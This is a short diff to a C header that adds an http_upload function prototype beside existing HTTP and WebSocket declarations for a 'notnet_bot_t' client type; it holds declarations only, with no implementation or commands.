@@ -139,6 +139,7 @@ int http_post(notnet_bot_t *bot, const char *data, int len);
 int http_get(notnet_bot_t *bot, char *buf, int len);
 int http_read(notnet_bot_t *bot, char *buf, int len);
 int http_download(notnet_bot_t *bot, const char *url, const char *dest);
+int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path);
 void http_disconnect(notnet_bot_t *bot);
 
 /* ── WebSocket Functions ────────────────────────────────────── */
